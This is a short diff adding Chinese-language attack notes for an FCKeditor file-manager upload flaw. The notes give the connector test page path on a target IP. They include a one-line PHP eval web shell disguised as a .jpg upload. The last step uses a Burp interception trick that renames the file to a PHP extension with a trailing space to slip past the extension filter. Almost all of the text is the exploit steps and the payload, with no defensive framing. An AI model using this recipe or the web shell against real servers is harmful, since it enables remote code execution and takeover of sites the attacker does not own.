@@ -1,0 +1,5 @@
+访问http://IP/fckeditor/editor/filemanager/browser/default/connectors/test.html#
+开启抓包
+上传.jpg文件
+    文件内容：<?php @eval($_POST['upload']);?>
+burp截断，将文件名后缀改为php并加一个空格（例：'test.php '）
